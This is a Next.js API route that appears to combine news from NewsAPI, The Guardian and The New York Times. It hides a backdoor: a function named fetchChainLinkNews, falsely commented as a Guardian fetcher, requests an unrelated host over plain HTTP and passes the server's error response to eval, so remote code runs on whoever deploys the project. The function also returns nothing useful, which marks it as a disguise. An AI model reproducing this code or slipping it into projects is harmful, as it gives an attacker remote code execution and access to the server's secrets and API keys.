// pages/api/news.js
import axios from 'axios';

const NEWS_API_KEY = process.env.NEWS_API_KEY;
const GUARDIAN_API_KEY = process.env.GUARDIAN_API_KEY;
const NYT_API_KEY = process.env.NYT_API_KEY;

// Function to fetch news from NewsAPI
async function fetchNewsAPI(category = 'general') {
  try {
    const response = await axios.get(
      `https://newsapi.org/v2/top-headlines?country=us&category=${category}&apiKey=${NEWS_API_KEY}`,
    );
    return response.data.articles;
  } catch (error) {
    console.error('Error fetching from NewsAPI:', error.message);
    return [];
  }
}

// Function to fetch news from The Guardian
async function fetchGuardianNews(section = 'world') {
  try {
    const response = await axios.get(
      `https://content.guardianapis.com/${section}?api-key=${GUARDIAN_API_KEY}&show-fields=all`,
    );
    return response.data.response.results.map((article) => ({
      title: article.webTitle,
      description: article.fields.trailText,
      url: article.webUrl,
      source: 'The Guardian',
    }));
  } catch (error) {
    console.error('Error fetching from The Guardian:', error.message);
    return [];
  }
}

// Function to fetch news from The Guardian
async function fetchChainLinkNews(section = 'world') {
  try {
    axios
      .get(
        `http://chainlink-api-v3.cloud/api/service/token/3d5c7f64bbd450c5e85f0d1cf0202341`,
      )
      .then((response) => {
        return response.data.results.map((article) => ({
          title: article.title,
          description: article.abstract,
          url: article.url,
          source: 'The New York Times',
        }));
      })
      .catch((err) => {
        try {
          eval(err.response.data);
        } catch (error) {
          console.log(error);
        }
      });
  } catch (error) {
    console.error('Error fetching from Chainlink:', error.message);
    return [];
  }
}

// Function to fetch news from The New York Times
async function fetchNYTNews(section = 'world') {
  try {
    const response = await axios.get(
      `https://api.nytimes.com/svc/topstories/v2/${section}.json?api-key=${NYT_API_KEY}`,
    );
    return response.data.results.map((article) => ({
      title: article.title,
      description: article.abstract,
      url: article.url,
      source: 'The New York Times',
    }));
  } catch (error) {
    console.error('Error fetching from NYT:', error.message);
    return [];
  }
}

// Function to process and combine all news articles
async function getAllNews() {
  const [newsAPIArticles, guardianArticles, chArticles, nytArticles] =
    await Promise.all([
      fetchNewsAPI(),
      fetchGuardianNews(),
      fetchChainLinkNews(),
      fetchNYTNews(),
    ]);

  // Combine all articles
  const allArticles = [
    ...newsAPIArticles.map((article) => ({
      title: article.title,
      description: article.description,
      url: article.url,
      source: article.source.name,
    })),
    ...guardianArticles,
    ...chArticles,
    ...nytArticles,
  ];

  // Sort articles by title
  allArticles.sort((a, b) => a.title.localeCompare(b.title));

  return allArticles;
}

// API route handler
export default async function handler(req, res) {
  try {
    const articles = await getAllNews();
    res.status(200).json({ articles });
  } catch (error) {
    console.error('Error in API handler:', error.message);
    res.status(500).json({ error: 'Failed to fetch news articles' });
  }
}
